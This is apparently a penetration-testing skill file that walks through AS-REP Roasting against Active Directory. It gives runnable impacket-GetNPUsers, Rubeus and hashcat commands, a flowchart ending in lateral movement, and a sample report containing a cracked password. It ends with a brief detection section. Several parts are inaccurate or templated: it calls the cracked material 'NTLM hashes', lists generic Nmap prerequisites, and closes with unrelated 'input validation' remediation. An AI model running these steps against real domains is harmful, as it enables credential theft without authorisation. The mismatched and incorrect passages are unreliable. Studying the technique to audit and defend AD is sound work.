---
name: active-directory-asreproasting
description: >
  Execute AS-REP Roasting to extract and crack the NTLM hashes of Active Directory user accounts 
  that have the "Do not require Kerberos preauthentication" flag explicitly enabled. This attack 
  generates a recoverable Ticket Granting Ticket (TGT) without requiring the attacker to authenticate first.
domain: cybersecurity
subdomain: penetration-testing
category: Network
difficulty: intermediate
estimated_time: "1-2 hours"
mitre_attack:
  tactics: [TA0006]
  techniques: [T1558.004]
platforms: [windows, linux]
tags: [active-directory, kerberos, asreproasting, rubeus, impacket, credential-access]
tools: [rubeus, impacket, hashcat, john-the-ripper]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Active Directory AS-REP Roasting

## When to Use
- When performing external or internal enumeration and you DO NOT possess any valid Active Directory credentials (a completely unauthenticated position), but you have a list of valid usernames.
- When an administrator has misconfigured user accounts by checking the "Do not require Kerberos preauthentication" setting (often done for legacy Linux integrations or broken service wrappers).
- As a secondary, faster credential extraction method alongside Kerberoasting.


## Prerequisites
- Network access to the target subnet (VPN, pivot, or direct connection)
- Nmap and relevant network scanning tools installed
- Understanding of TCP/IP, common protocols, and network segmentation
- Root/admin access on the attack machine for raw socket operations

## Workflow

### Phase 1: Understanding the Mechanism

```text
# Concept: By default in Active Directory, when a user requests a Kerberos Ticket (TGT), 
# they must prove they know their password by sending a timestamp encrypted with their password 
# hash (this is Preauthentication).

# The Vulnerability: If "Do not require Kerberos preauthentication" is enabled on a user account,
# ANYONE on the network can ask the Domain Controller for a TGT for that user. 
# The DC will happily bundle up the TGT, encrypt a portion of it with the user's password hash, 
# and send it to the attacker. 

# The attacker can then take this AS-REP (Authentication Service Response) offline and crack it.
```

### Phase 2: Unauthenticated AS-REP Roasting (Impacket)

```bash
# Concept: From a Kali Linux box with NO domain credentials, we feed a list of usernames 
# to the DC. If any have the flaw, we get their hash.

# 1. Provide Impacket with a wordlist of usernames to test against the Domain Controller.
impacket-GetNPUsers CORP.LOCAL/ -no-pass -usersfile usernames.txt -format hashcat -dc-ip 192.168.1.100

# 2. Output Analysis:
# If the user `SVC_Backup` is misconfigured, Impacket downloads the hash in real-time.
# Output: `$krb5asrep$23$SVC_Backup@CORP.LOCAL:34f41...`
```

### Phase 3: Authenticated Discovery (Rubeus)

```powershell
# Concept: If you ALREADY have compromised a low-level domain user, you don't need a wordlist. 
# You can query LDAP explicitly for all misconfigured accounts and request the tickets automatically.

# 1. Execute Rubeus on a domain-joined machine.
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Rubeus queries LDAP for `userAccountControl` containing `DONT_REQ_PREAUTH` (Value 4194304).
# It requests the AS-REP for every single vulnerable account found and outputs to the text file.
```

### Phase 4: Offline Cracking (Hashcat)

```bash
# Concept: The AS-REP hash must be decrypted to yield the plaintext password.

# 1. Identify the hash format. Standard AS-REPs are Kerberos 5 AS-REP etype 23 (Hash Type 18200).
# 2. Execute hashcat against the extracted file.
hashcat -m 18200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O

# 3. If the user's password is in the dictionary, it will be cracked. You now possess valid credentials for the network.
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify target Domain] --> B{Do you have ANY valid credentials?}
    B -->|Yes| C[Execute `Rubeus asreproast` or `GetNPUsers` with credentials to query LDAP directly]
    B -->|No| D[Gather OSINT/Username lists (e.g., LinkedIn scraping, SMB Null Sessions)]
    D --> E[Execute `GetNPUsers` providing the username list and `-no-pass`]
    C --> F[Extract AS-REP Hashes]
    E --> F
    F --> G[Crack offline using Hashcat module 18200]
    G --> H[Password Recovered. Lateral Movement achieved.]
```

## 🔵 Blue Team Detection & Defense
- **Audit UserAccountControl**: Immediately identify and remediate any Active Directory accounts with the `DONT_REQ_PREAUTH` flag enabled. Use PowerShell to audit the domain: 
  `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True}`. Disable this requirement entirely unless absolutely required by a specific legacy appliance.
- **Enforce Complex Passwords**: As with Kerberoasting, if preauthentication disabling is mandatory for a system to function, the associated account must be enforced to use a 30+ character random password to mathematically guarantee immunity against offline Hashcat dictionary attacks.
- **Kerberos Anomaly Detection**: Configure SIEM alerts (Windows Event ID 4768) if a single IP address systematically requests hundreds of TGT tickets for various accounts within seconds, behavior entirely disconnected from normal interactive logon flows.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Preauthentication | A Kerberos defense mechanism requiring the requesting user to prove they know their password (by encrypting a timestamp) before the Domain Controller issues any tickets |
| AS-REP | Authentication Service Response; the message the KDC (Key Distribution Center) sends back to the client containing the Ticket Granting Ticket (TGT) |
| UAC Flags | UserAccountControl; a bitmask integer stored in Active Directory defining the security properties of a user account |

## Output Format
```
Penetration Test Report: Unauthenticated Credential Extraction via AS-REP Roasting
==================================================================================
Tactic: Credential Access (T1558.004)
Severity: High (CVSS 8.1)
Target: `SVC_Jenkins` Account

Description:
During initial perimeter enumeration from an unauthenticated posture, the Red Team obtained a list of valid corporate usernames via OSINT gathering and metadata extraction from public PDFs.

Utilizing Impacket's `GetNPUsers` module across the unauthenticated network boundary targeting the internal Domain Controller, it was discovered that the `SVC_Jenkins` account had been explicitly configured to disable Kerberos Preauthentication (`DONT_REQ_PREAUTH`). 

The attack successfully requested the AS-REP message, allowing the offline extraction of the Kerberos Ticket. Utilizing a dictionary-based attack on GPU infrastructure, the associated NTLM password (`DevOpsRulez123`) was cracked in 45 seconds. 

Impact:
The attacker transitioned from a black-box, unauthenticated state to possessing fully valid domain credentials without generating login failure alerts on the Domain Controller. The compromised Service Account permitted read access to source code repositories.
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Ired.team: [AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-impacket)
- Harmj0y: [Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
- MITRE ATT&CK: [AS-REP Roasting (T1558.004)](https://attack.mitre.org/techniques/T1558/004/)
